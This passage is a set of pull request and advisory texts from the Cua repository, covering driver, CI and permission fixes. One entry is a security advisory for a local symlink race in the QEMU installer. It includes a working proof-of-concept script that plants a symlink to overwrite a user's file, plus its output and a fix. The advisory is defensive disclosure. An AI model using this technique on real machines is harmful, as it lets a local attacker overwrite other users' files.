- The WPF and WinUI 3 harness smokes now assert each fixture AutomationId in structured `elements`, and that the patternless `lbl-counter` is indexed (with no `actions` on WPF).
- The scoped repository checks (`bin/ci --quick`) pass here. The Linux arm64 host cannot run the Windows crate's tests or the native Windows harness; CI runs those lanes.

## Checklist

- [x] `bin/ci --quick` is green (heavy checks run in CI)
- [x] External contributor authorship is preserved

title: ci: remove the expired handover_process flaky quarantine (CUA-3855)
body:
Refs CUA-3855.

For users: nothing changes. This unblocks every PR, because the required check "quarantine list and flaky tooling" fails on all of them since the quarantine entry for `handover_process::the_next_relay_waits_then_serves_what_queued` expired on 22 Nov.

**Root cause.** The flake was a race in the test's own setup: it picks a free port by binding port 0 and closing it, then starts the relay on that port. A parallel test process could take the port in between, and the relay died with "address in use". That was fixed in #7003 (the test now retries the start on fresh ports when the relay exits while starting). The quarantine entry added next to it was never removed, and was renewed once without a new failure.

**Why it is safe to remove.** I read the relay's startup and standby code too: it binds the main port and then the health port before waiting for the state lock, so "health answers" really means both ports are held, and no further race turned up. Stability evidence, with 0 failures:
- 40 serial runs of the test
- 96 runs, 12 in parallel, with 8 CPU hogs running
- 60 runs, 6 in parallel, alongside the `shutdown` and `mesh_default` relay process tests and 6 CPU hogs
- about 30 sampled spacesd CI runs since 8 Nov: the test passes on the first try, with no retry or failure

The change deletes the entry, so a regression fails the spacesd lanes again instead of being forgiven. `flaky.py validate` passes and `bin/ci --quick` is green.

title: fix(cua-driver,spaces-macos): give the + route in the macOS permission guides
body:
## Why

macOS 27 beta 2 reportedly stops accepting an app dragged into a Privacy & Security list, so **+** is the only way to add one. It also stops recording automatic-denial rows for Full Disk Access. Cua Spaces' permission guide told people to drag the app in when it had no row and never asked macOS, so a fresh Mac on beta 2 had no way forward. Cua Driver's guide window and its Full Disk Access hint had the same gap in their fallback text.

The decision record is the internal `tcc-dragin-check` report (sections 1a, 1b, 1c and the FDA part of 2). The product answers that shape this PR, from 23 Nov 2026: keep the drag tile on macOS versions that still accept drops (Q2), and have the Spaces guide ask macOS once when the app has no row (Q3).

## What changed

- **Cua Spaces `PermissionGuide`**: for the `.absent`, `.off` and `.unknown` states the panel now says to click **+** and choose the app at `Bundle.main.bundleURL` (so Cua Spaces Local names its own path). The drag tile and "Or drag this in." show only when `ProcessInfo.operatingSystemVersion.majorVersion < 27`. When the guide reads `.absent`, it asks macOS once per run (`CGRequestScreenCaptureAccess` or `AXIsProcessTrustedWithOptions` with the prompt option, both in `PermissionRequester`), so macOS adds the row and the panel moves on to "turn on the switch". The `host.openSettings` comment that ruled out macOS's prompt is reversed to match.
- **Cua Driver guide window** (`guide.rs`, `panel.rs`): `DRAG_HINT` becomes `add_hint`, which gives the + route with the host bundle's exact path. The drag tile and "Or drag this into it:" show only before macOS 27 (`kern.osproductversion`), and without the tile its row takes no room. `PROFILE_PROTECTION_HINT` now says to click + in Full Disk Access and choose `/Applications/CuaDriver.app`.
- **Docs**: `cua-driver/quickstart.mdx` describes the + route, with the tile as the pre-27 alternative.

## Scope

This covers the two guides, the CuaDriver.app Full Disk Access hint and the quickstart line. It leaves out Teleport's Full Disk Access copy (a separate item), the Hoy extension's FDA onboarding, and the vendored PermissionFlow default strings. The host always sets its own guidance, so those defaults never show.

## Tradeoffs

- The version check keys on the major version (27), not a beta build number. If 27.0 betas before beta 2 still took drops, they lose the tile but keep the + route, which works everywhere.
- "Once" is per app run and per pane, held in memory. A user who resets TCC gets the prompt again on the next launch. Holding it per run, not on disk, avoids a case where the prompt never shows again.
- When cua-driver can't read the macOS version, it shows no tile, since the + text works on every version.

## Blast Radius

Only macOS permission onboarding is affected: the Spaces first-run "Share this Mac's screen" step, Settings → Permissions, and `cua-driver permissions grant` / the startup gate. On macOS 26 and earlier the tile still shows, with + added to the text. The new prompt fires only when TCC reports no row (`TCCAccessPreflight` returns 2), and `PermissionPromptGuardTests` still holds every prompting call to `PermissionRequester.swift`. No Windows or Linux code changes. The guide window and Spaces panel are macOS-only, so the cross-platform driver contract does not change.

## Verification

Ran locally on macOS 26.6.2:

- `cargo test -p platform-macos --lib -- permissions:: browser::platform::tests::devtools_active_port`: 56 passed. This includes the new `add_hint_gives_the_plus_route_and_the_exact_path`, `the_drag_tile_shows_only_before_macos_27` and `without_the_drag_tile_its_row_takes_no_room`.
- `cargo clippy -p platform-macos --all-targets -- -D warnings`: clean.
- SWIFT_RESULT
- `bin/ci --quick` (the scoped repository checks): 6 passed, 5 skipped by `--quick`.

Not run: anything on macOS 27 beta 2. Nobody here has run the drop refusal, the prompt adding the row, or + accepting the app on that build. These come from the report and need a beta 2 Mac.

- [x] `bin/ci --quick` passes

title: Local symlink overwrite in cua-sandbox QEMU installer via tempfile.mktemp()
body:
## Affected revision

- Repository: `trycua/cua`
- Location: `libs/python/cua-sandbox/cua_sandbox/runtime/qemu_installer.py:119`
- Advisory: https://github.com/trycua/cua/security/advisories/GHSA-2wp2-g9w8-39xq

### Summary

cua-sandbox downloads QEMU through a tempfile.mktemp() name and opens it with a plain open(), so a local process with write access to the temporary directory can plant a symbolic link and overwrite any file the installing user can write (CWE-377).

### Details

Repository: trycua/cua
Component: cua-sandbox (Python SDK)
File: libs/python/cua-sandbox/cua_sandbox/runtime/qemu_installer.py
Lines: 119 (tempfile.mktemp) and 126 (open(tmp, "wb"))
Current default branch: main at 4e4f57f60ff13f1b12f688ff845e277c389243f8 ("ci: enforce staging-first in Spaces and Cua Driver publish (CUA-1907) (#5539)", 2026-10-20)
The same code is present at ba3e14fd8beb441c532bf75e3ef84c29d454213c, where the behavior was first observed. Any revision containing this mktemp() + open() pair in _download_zip is affected.
Current code at main:

python


114: def _download_zip(url: str, dest_dir: Path, description: str) -> None:
115:     """Download and extract a zip to dest_dir."""
116:     dest_dir.mkdir(parents=True, exist_ok=True)
117:
118:     logger.info(f"Downloading {description} from {url} ...")
119:     tmp = tempfile.mktemp(suffix=".zip")
120:     try:
121:         with httpx.Client(follow_redirects=True, timeout=300) as client:
122:             with client.stream("GET", url) as resp:
123:                 resp.raise_for_status()
124:                 total = int(resp.headers.get("content-length", 0))
125:                 downloaded = 0
126:                 with open(tmp, "wb") as f:
127:                     for chunk in resp.iter_bytes(chunk_size=1024 * 256):
128:                         f.write(chunk)
_download_zip is on the user-facing install path: _download_portable() calls it with QEMU_PORTABLE_URL (line 152) and _download_wimlib() calls it with WIMLIB_URL (line 160).

tempfile.mktemp() returns a path that nothing holds. Between its return at line 119 and the open() at line 126, another process can create a symbolic link at that path. open(tmp, "wb") follows the link, so the bytes received from the network are written to the link target. The code never verifies that the file it opens is the file it asked for. The finally block unlinks tmp after the write, but the bytes have already gone through the planted link, so the overwrite is not undone.

The safe alternatives (mkstemp, mkdtemp, NamedTemporaryFile) create the object they return. For example:

diff


-    tmp = tempfile.mktemp(suffix=".zip")
+    fd, tmp = tempfile.mkstemp(suffix=".zip")
+    os.close(fd)
     try:
         with httpx.Client(follow_redirects=True, timeout=300) as client:
             with client.stream("GET", url) as resp:
The existing finally: os.unlink(tmp) cleanup keeps working, and a pre-existing path becomes an error instead of a redirect.

A search of all 5,444 issues and pull requests in trycua/cua found no existing report for this code shape. The nearest pull request, #5528, does not touch this file or line.



### Proof of concept

Environment used: Linux x86_64 container (python:3.12-slim), Python 3.12, httpx installed. The test needs no network; a stub client supplies the downloaded bytes.

The test script imports the real module, stubs only httpx and cua_sandbox._paths, and wraps tempfile.mktemp() to plant the symlink immediately after the real call returns. The shipped function is not modified.

Clone the repository and copy the file under test into a scratch directory:
bash


git clone https://github.com/trycua/cua.git
mkdir -p /tmp/w
cp cua/libs/python/cua-sandbox/cua_sandbox/runtime/qemu_installer.py /tmp/w/qemu_installer.py
Save the following as /tmp/w/driver.py:
python


import importlib.util, os, sys, types
from pathlib import Path

MODE = sys.argv[1]                                   # repro | control
TARGET = ("/tmp/w/qemu_installer.py" if MODE == "repro"
          else "/tmp/w/fixed_qemu_installer.py")
VICTIM = "/tmp/w/victim.txt"                         # a file the user owns
PAYLOAD = b"ATTACKER-CONTROLLED!"

class Resp:
    headers = {"content-length": str(len(PAYLOAD))}
    def raise_for_status(self): pass
    def iter_bytes(self, chunk_size=1024):
        yield PAYLOAD
    def __enter__(self): return self
    def __exit__(self, *a): return False
class Client:
    def __init__(self, **kw): pass
    def __enter__(self): return self
    def __exit__(self, *a): return False
    def stream(self, method, url): return Resp()

httpx = types.ModuleType("httpx"); httpx.Client = Client
sys.modules["httpx"] = httpx
pkg = types.ModuleType("cua_sandbox"); pkg.__path__ = []
paths = types.ModuleType("cua_sandbox._paths")
paths.cua_home = lambda: Path("/tmp/w/home")
sys.modules["cua_sandbox"] = pkg; sys.modules["cua_sandbox._paths"] = paths

spec = importlib.util.spec_from_file_location("qemu_installer_" + MODE, TARGET)
mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)

Path(VICTIM).write_text("ORIGINAL USER FILE\n")
real_mktemp = __import__("tempfile").mktemp

def attacker_mktemp(*a, **kw):
    p = real_mktemp(*a, **kw)                        # the call the shipped code makes
    try:
        os.symlink(VICTIM, p)                        # attacker wins the window
        print(f"[attacker] symlink planted: {p} -> {VICTIM}")
    except FileExistsError:
        print(f"[attacker] cannot plant symlink at {p}: path already exists")
    return p

__import__("tempfile").mktemp = attacker_mktemp

print(f"[run] mode={MODE} _download_zip('https://example.invalid/x.zip', '/tmp/w/out', 'demo')")
try:
    mod._download_zip("https://example.invalid/x.zip", Path("/tmp/w/out"), "demo")
    print("[run] _download_zip returned normally")
except Exception as e:
    print(f"[run] _download_zip raised {type(e).__name__}: {e}")
body = Path(VICTIM).read_text()
print(f"[victim] {VICTIM} now contains: {body!r}")
print(f"[victim] overwritten by the download: {body.startswith('ATTACKER')}")
Run the reproduction:
bash


python3 /tmp/w/driver.py repro
Observed at the current main (and at ba3e14fd8beb):

Code block


[run] mode=repro _download_zip('https://example.invalid/x.zip', '/tmp/w/out', 'demo')
[attacker] symlink planted: /tmp/tmpjqh246av.zip -> /tmp/w/victim.txt
  downloading demo … 100%
[run] _download_zip raised BadZipFile: File is not a zip file
[victim] /tmp/w/victim.txt now contains: 'ATTACKER-CONTROLLED!'
[victim] overwritten by the download: True
The BadZipFile is the extraction step failing on the stub payload; it does not undo the write, which has already happened through the link. In a real run the payload is the QEMU zip and the download completes normally.

Control experiment. Copy the same file with only the name-selection line changed to mkstemp, then run the same test script:
bash


python3 - <<'EOF'
src = open("/tmp/w/qemu_installer.py").read()
old = '    tmp = tempfile.mktemp(suffix=".zip")'
new = '    fd, tmp = tempfile.mkstemp(suffix=".zip")\n    os.close(fd)'
assert old in src
open("/tmp/w/fixed_qemu_installer.py", "w").write(src.replace(old, new))
EOF
python3 /tmp/w/driver.py control
Control output:

Code block


[run] mode=control _download_zip('https://example.invalid/x.zip', '/tmp/w/out', 'demo')
  downloading demo … 100%
[run] _download_zip raised BadZipFile: File is not a zip file
[victim] /tmp/w/victim.txt now contains: 'ORIGINAL USER FILE\n'
[victim] overwritten by the download: False
Because mkstemp creates the file, the attacker's os.symlink fails and the download lands in the private file. The only difference between the two runs is that single line.

A minimal demonstration that the name is unreserved:

bash


python3 -c "import tempfile, os; p = tempfile.mktemp(suffix='.zip'); print(p, os.path.exists(p))"
It prints a path that does not exist, which is exactly why the name can be taken before open().



### Impact

A local user who can write in the shared temporary directory can redirect the QEMU (or wimlib) download to any file the installing user can write, during the install window. The result is silent corruption or replacement of a user file with attacker-chosen bytes.

Preconditions:

a second principal on the same machine;
write access to the temporary directory used by the installer;
winning the window between mktemp() and open();
the install must be running.
The issue does not apply when the temporary directory is private to the user, and it does not by itself expose the sandbox or the host to a remote party. Severity is low; the impact is local file integrity, not remote code execution.

title: fix(cua-driver): discover a fail-closed DISPLAY/XAUTHORITY pair on Linux
body:
## Summary

- Problem this solves: from SSH or a TTY into a running Linux desktop, `DISPLAY` and `XAUTHORITY` can both be unset. Discovery returned early without `DISPLAY`, so capture failed with `$DISPLAY variable not set` even though the user's own Xwayland was running. The existing cookie path also took the first `-auth` file it saw, without checking owner, uniqueness or file mode.
- What changed:
  - `platform_linux::xauth::ensure_xauthority_discovered` sets `DISPLAY` and `XAUTHORITY` together when both are unset. It only does this when exactly one X server (`Xwayland`, `Xorg`, `X`) owned by the effective uid gives both a `:N` display and an `-auth` file. Zero, several, or conflicting candidates leave the environment unchanged.
  - The cookie must open with `O_NOFOLLOW`, be a regular file owned by this uid, and have mode `& 0o077 == 0`. Each process is pinned by its `/proc/<pid>/stat` start time, read before its owner and argv and again with argv after the cookie check, so a server that exited or whose PID was reused in between is dropped. Candidates are counted per process, so two servers with the same arguments are ambiguous. An argv without its closing NUL is rejected, as are `-auth` values that are missing, empty, relative, repeated or not UTF-8, and more than one `:N`.
  - Values the caller set are never replaced. When `DISPLAY` is set and `XAUTHORITY` is not (#1926), only a server on that local display, or one that picked its own display (GDM's Xorg uses `-displayfd`), counts as a match. Local forms are `:N`, `unix:N` and `unix/:N`, each with an optional numeric `.screen`; a remote or forwarded `DISPLAY` such as `localhost:10.0` is left alone. The one-time `OnceLock` is gone: each call checks the values it adopted against a fresh scan, replaces a rotated cookie, and unsets them if their server is gone.

## Related work

Fixes #3047

Refs #1926, #1999

RFC: not required. No API, CLI or protocol change.

## Compatibility and risk

- User-visible, API/CLI/MCP, migration, permission, or platform impact: Linux only. SSH/TTY launches into a running same-user X or Xwayland session now find the display without manual exports. Two setups that used to adopt a cookie now fail closed: a cookie owned by another user (for example root's LightDM Xorg auth, which the user could not read anyway), and a host with several same-user X servers where `DISPLAY` does not pick one. The doctor hint for an unset `DISPLAY` now names the discovery rule.
- Risk and rollback: one module plus a hint string. Revert the commit to roll back.

## Validation

- Focused tests and checks: unit tests in `xauth.rs` cover the GNOME/Mutter, KDE/KWin and GDM Xorg argv layouts, malformed argv, keeping explicit values without a scan, no candidate, one candidate, ambiguous or conflicting candidates, a candidate with no display when one is needed, remote `DISPLAY`, the `/proc/<pid>/stat` start-time parse, two processes with identical arguments, cookie rotation and disappearance, and a fake `/proc` with an other-uid server, group-readable, symlinked, directory and missing cookies, and a non-X process. `cargo test -p platform-linux --lib xauth` passed (13 tests) and `bin/ci --quick` passed (rustfmt, SPDX headers). The rest of the scoped repository checks run in CI.
- Manual or platform evidence: none. No GNOME or KDE desktop on this host.
- Known gaps or CI still required: the variables are only revalidated when `ensure_xauthority_discovered` runs, which is still only at daemon startup. Rescanning before each X11 connect would mean changing the environment while worker threads run, so that is left as a follow-up.

title: fix(cua-driver): hide the GNOME agent cursor when the daemon that drew it exits
body:
## Summary

- Problem this solves: on GNOME Wayland the agent cursor is an actor inside gnome-shell (the `winrects@cua` helper). When the cua-driver daemon restarts, crashes or is stopped, nothing hides it: the idle timeout ran inside the old daemon, and the new daemon has no session to end. The cursor and its badge stay painted until the next login.
- What changed:
  - The helper (API and metadata version 13) records the bus client whose draw last landed (`MoveCursor`, `ClickPulse`, or a valid `PlayCursorPath`) and watches its unique name. When that connection closes, the cursor hides. The driver already keeps one session-bus connection for its whole lifetime, so this name lives exactly as long as the daemon. When a different client draws, it takes over the cursor, and the earlier client leaving no longer hides it.
  - At startup, the daemon hides the cursor if the loaded helper is older than API 13. Upgrading installs the new helper files, but GNOME keeps running the old copy until the next login, so this covers restarts in that window. On API 13 the daemon skips this step, because the cursor on screen may belong to another live client, such as another app's bundled driver.

## Related work

Fixes #3062

RFC: not required. The D-Bus method signatures are unchanged. The helper's API version goes up by one for the new behavior.

## Compatibility and risk

- User-visible impact: an agent cursor no longer outlives the daemon that drew it on GNOME Wayland. The helper is reinstalled by the driver installer as usual. The new behavior starts after the next login, and until then the startup hide covers restarts.
- Risk: the three drawing methods now run as GJS `…Async` handlers that reply through the invocation, the same pattern `Activate` and the capture methods already use. If the driver's bus connection is dropped after a transport failure, the cursor hides once and comes back on the next draw over the new connection.
- Rollback: revert this PR. Helper v12 behavior comes back after reinstall and re-login.

## Validation

- Focused tests and checks:
  - `node libs/cua-driver/scripts/tests/test_wayland_helper_safety.mjs`: a new case covers a draw that claims the cursor, a malformed track that draws nothing and so does not claim it, a second client taking it over, the stale owner leaving with no hide, the current owner leaving and hiding it, and `disable()` dropping the watch. It fails on main's extension. It also fails with either of two mutations: removing the hide in the vanish callback, removing the stale-owner guard, or claiming before the track is validated.
  - `node libs/cua-driver/scripts/tests/test_wayland_helper_cursor_paint.mjs` and the pytest wrappers for the helper (`test_wayland_helper_safety.py`, `test_wayland_helper_cursor_paint.py`, `test_wayland_helper_install.py`) pass.
  - The scoped repository checks: `bin/ci --quick` passes (rustfmt, SPDX headers).
- Manual or platform evidence: in a headless GNOME Shell, the three drawing methods return valid empty replies, and the owning client disconnecting hides the cursor. The daemon's startup hide has not been run on a desktop.
- Known gaps or CI still required: the Rust change was not compiled locally because the host was short on disk. Clippy and unit tests are left to CI. The startup hide has no unit test: it has no seam short of a verified gnome-shell bus owner.

title: fix(cua-driver): find the Linux browser setup checkbox by structure
body:
## Summary

- Problem this solves: on Linux, existing-profile setup found the `chrome://inspect` remote-debugging page by its English heading ("Remote debugging") and the checkbox by its English label ("Allow remote debugging for this browser instance"). Both are page text, so a Chromium build that translates them could leave setup waiting until it timed out, even though the page and its toggle were there.
- What changed:
  - When the rendered document reports its URI over AT-SPI, that URI alone proves the setup page. The heading is no longer required on that path. A contradictory address bar is still refused.
  - The checkbox is now the one actionable, enabled checkbox inside the rendered document (`in_web_content`), the same rule the Windows adapter uses. A checkbox in the browser's own UI is never used, and two candidates are refused with `BrowserWrongTargetRefused`.
  - Because the checkbox is now picked by position, a window exposing more than one rendered document is refused, as on Windows, so a second document cannot supply the checkbox.
  - When the browser reports no document URI, the old fallback stays as it was, including the heading check, so an address-bar value or a trusted navigation still cannot act alone.

The omnibox and consent paths were already structural (see the issue thread), so this PR only covers the setup page.

## Related work

Fixes #3137

RFC: not required. No protocol, permission or public API change.

## Compatibility and risk

- User-visible, API/CLI/MCP, migration, permission, or platform impact: Linux only. Exact window scoping, URI verification, spoof refusal through a contradictory address bar, ambiguity refusal and rollback are unchanged.
- Risk and rollback: if Chromium ever exposed more than one checkbox inside the setup document, setup would now refuse where it used to match the label. Windows has used the same uniqueness rule against the same Chromium accessibility tree. Revert this PR to roll back.

## Validation

- Focused tests and checks: new unit tests in `platform-linux/src/browser_setup_ui.rs` cover a translated inspect page proven by its document URI, a browser-UI checkbox being ignored, two web checkboxes being refused, a second URI-less document being refused, and the heading still being required when no URI is reported. The first commit adds the tests alone, so they should fail against the old label matching. The scoped repository checks ran in quick mode (`bin/ci --quick`: rustfmt, SPDX headers, image refs). title: test(cua-driver): load documented capability manifests through the driver loader
body:
## Summary

- Problem this solves: #3193 reported three places where the Cua Driver docs disagreed with the shipped driver: the bounded `serve` flags, the capability manifest format, and the retired `browser-approve` token flow. Current main already fixes all three in the user docs. The bounded examples use `--capability-manifest`/`--approve-capability-manifest` (and the `cli-shape` docs lane checks those flags), the manifests are `version: 3` with `expires_after` and `idle_timeout`, and the browser guide leads with `--grant existing-profile`. What was missing is a check on the manifest examples. The docs `config` lane only parses them as YAML, so a manifest the driver rejects would still pass. That is the drift in point 2.
- What changed: a `cua-driver-core` integration test that reads every YAML fence in `docs/content/docs/cua-driver` and picks the ones whose unindented key lines include a manifest-only key (`version`, `mode`, `expires_after`, `idle_timeout`, `resources`), loads it with `session_manifest::load_manifest`, and runs `validate_for_mode(Bounded)` on it. It fails with the page, the line and the loader's error. Policy files use only `allow` and `deny`, so it skips them. Selection does not depend on the YAML parsing, so an example with a quoted, duplicate or malformed key still reaches the loader and fails there. It also fails when it finds no manifests, so moving the docs cannot make it pass by checking nothing. It returns early when the docs tree is missing (the Nix filtered source), as `removed_tool_docs_test.rs` does.
- A `driver capability manifests` job in `Docs: Swift, Kotlin and Rust blocks compile` runs this test. That workflow runs on `docs/content/docs/**` changes, so a docs-only edit to a manifest is checked too. `CI: Rust Linux unit` runs only for driver code changes.

## Related work

title: fix(cua-driver): no agent cursor for a viewer's desktop click on Wayland (unblocks Omarchy image release)
body:
## What broke
The nightly Omarchy image release (`cd-image-omarchy`) has failed every night since 16 Nov, and the cua-spacesd image release (`cd-images-spacesd-release`) failed with it. Both stop at the image end-to-end gate, so no new Omarchy image or cua-spacesd image could be released.

## Root cause
It is not a mirror problem. The gate check "desktop stream: click focuses the window" fails with "an agent cursor overlay at the viewer's click (135-150 coloured px)". The Wayland desktop click path added in #5613 (merged 15 Nov) glides the agent cursor to the click point and waits for it to arrive, without checking who the input came from. A viewer's click on a desktop stream is human input, which must never draw an agent cursor, so the viewer saw an extra agent cursor at their own click. The gate caught exactly that. The last green run (15 Nov) predates the change.

## Fix
A session that draws no cursor (human viewer input) now skips the glide and the arrival wait on the desktop click path, and `animate_and_wait` itself refuses to enable or move a cursor for such a session, so no other caller can repeat it. Agent clicks behave as before. Added unit tests for the decision and for human-origin sessions drawing no cursor.

## How verified
`bin/ci --quick --fix` passes. The failing check's evidence screenshot shows the extra cursor at the click point. A run of the Omarchy image workflow on this branch is the end-to-end proof (see the PR checks).

Two other intermittent gate failures also showed up in some of those runs (SDK type into foot reporting a stale target, one window-stream type not delivered). They are separate from this regression and not changed here.

title: fix(cua-driver): match executable grants only on the attested process image
body:
Fixes #8565.

## What changes for users

In bounded mode, a capability manifest that grants an app by `executable:` now only covers a running process whose real program file (as read from the operating system) is that executable. If Cua Driver can't read the program file for a process, the grant doesn't apply to it and the call is refused.

## Change

`resource_matches_application` in `cua-driver-core/src/session_manifest.rs` matched `executable:` grants against `/fingerprint/executable`, then an unattested `executable` field, then the `launch_path` copied from `list_apps`. On Windows and Linux, `list_apps` pairs a running process with an installed app by file name, and `launch_path` is a launcher command line, not the image of the running process.

Executable grants for window and application observation and input now match only `/fingerprint/executable`, the image path the platform adapter read for that pid, and fail closed when it is absent. This is how path-style `bundle_id` grants (`bundle_grant_matches`) and `process_control` grants already worked. `launch_app` authorization still accepts `launch_path`, since no process exists yet at that point.

## Tests

- New `executable_grant_requires_the_attested_process_image`: for `window`, `application`, `window_input` and `application_input`, the granted image with an attested fingerprint is allowed; `launch_path` alone, an unreadable image path, an unattested top-level `executable`, and a different attested image are all refused.
- `cargo test -p cua-driver-core --lib session_manifest`: 24 passed.
- `bin/ci --quick`: green.

title: fix(cua-driver): refuse keyboard input to VMware Workstation guest consoles
body:
## Summary

- Problem this solves: on Windows, `press_key`, `hotkey` and `type_text` aimed at a VMware Workstation guest console reported success (`Sent 9 via SendInput (delivery_mode:foreground)`) while the guest received nothing. The console is an `MKSEmbedded` child under the `VMUIFrame` top-level, and the reporter's probes show it drops every synthesized route: foreground activation, Unicode and scancode `SendInput`, `WM_KEYDOWN`/`WM_KEYUP` with scancode bits, and `Ctrl+G`. `SendInput` still reports every event inserted, so the ✅ was false.
- What changed: a new `vmware` module detects a `VMUIFrame` root (via `GetAncestor(GA_ROOT)`) with an `MKSEmbedded` descendant. `press_key`, `hotkey` and `type_text` refuse as soon as they resolve the target window, before a UIA write, a `WS_EX_NOACTIVATE` change or any input. For an `x,y` call, `ClickTool` refuses on the HWND it resolves for the focus click, so the check and the click use the same window. The five Windows keyboard input functions (`post_char`, `post_type_text_with_delay`, `post_key`, `send_key_synthesized_after_focus`, `send_text_synthesized_paced_after_focus`) also check, which covers `type_text_chars` and `scope:"desktop"`. The tool result is an error with structured `code: input_delivery_unavailable`, `effect: refused`, `retryable: false`, `alternative_route: guest_side`. This follows the existing native ConsoleHost ARM64 refusal.

## Related work

Fixes #3210

RFC: not required. This adds a refusal for one surface and uses the existing refusal code.

## Compatibility and risk

- User-visible impact: keyboard tools aimed at a VMware Workstation window with a running guest console now return an explicit refusal in both delivery modes, not a false success. Keyboard tools aimed at the VMware library view (no `MKSEmbedded` child) and every other window are unchanged. While a guest console is open, keyboard tools also refuse VMware's own host-side controls in that window, such as UIA `element_token` writes, so the refusal does not depend on which control has focus. Clicks are out of scope.
- Risk and rollback: the check costs one `GetAncestor` plus one `GetClassNameW` per call, and enumerates children only when the root is `VMUIFrame`. If injected keys do reach the guest in some VMware configuration (for example after a physical click grabs input), this refusal blocks that case. The reporter's evidence shows no such route, so I have not added a bypass. Revert the PR to roll back.
- Scope: no VMware focus-proxy delivery route. None of the reporter's routes delivered, and this host has no Windows or VMware to prove a new one.

## Validation

- Focused tests: `vmware::tests` covers detection against the live child enumeration in #3210, frames without a console, the console class under another root, the exact refusal code and fields, and pass-through of unrelated errors. They are pure and run on every host.
- The scoped repository checks: `bin/ci --quick` passed (SPDX headers, rustfmt, image refs). Clippy, unit tests, UniFFI bindings and the Windows cross-check were skipped in quick mode and are left to CI.

title: fix(cua-driver): keep refreshed display-awake assertions held
body:
## Summary

A tool call can refresh the display-awake guard after the idle watcher observes an expired window but before it releases the assertion. The watcher then releases the refreshed assertion and exits, leaving that activity without its display-sleep protection.

Check the idle window and take the expired guard in one mutex critical section. A refreshed guard returns its remaining wait to the watcher; an expired or absent guard ends the watcher. Release the taken IOKit assertion outside the lock. Keep unconditional cleanup for a failed watcher-thread spawn unchanged.

## Related work

Fixes #8564. Thanks @soarkit for the interleaving trace and diagnosis.

The issue is assigned to @injaneity; this focused patch is offered for the existing owner's review. No matching PR was found when publishing.

No RFC: this restores the existing macOS idle-window contract without changing public APIs, environment settings or permissions.

## Compatibility and risk

- macOS only; other platform adapters are unchanged.
- Preserves the default idle window, disable settings, manual sleep/lock behavior and assertion type.
- The main risk is releasing too early or keeping an expired assertion. Tests cover refreshed activity, expiry and an already absent guard.
- No production test hooks, dependencies or protocol changes. Rollback is a revert of this commit.

## Validation

Candidate: `4aafb0920194019f35949dd7150557f6d1d98c72`, based on main `7ab934f82`. Checked locally on macOS arm64 with Rust 1.97.1.

- Baseline reproduction: a temporary test on unchanged main observes expiry, calls the real `note_activity`, then executes the stale unconditional release. It fails because fresh activity loses its assertion. The temporary probe is not included in the patch.
- `cargo test --locked --offline -p platform-macos --lib display_awake::`: 5 passed, including real IOKit assertion creation/release and both new regressions.
- Regression sensitivity: removing the idle recheck makes `refreshed_activity_survives_a_previously_expired_idle_decision` fail; restoring it passes.
- `cargo clippy --locked --offline -p platform-macos --all-targets -- -D warnings`: passed.
- `bin/ci --base upstream/main --quick --no-install`: 5 passed, 3 skipped (heavy tests, Clippy and binding generation are skipped by quick mode; focused tests and Clippy ran separately).
- Workspace formatting and `git diff --check`: passed.

Hosted CI and the canonical desktop matrix have not run. The deterministic regression simulates the interleaving without sleeps; no manual display-sleep or lock-screen test is claimed.
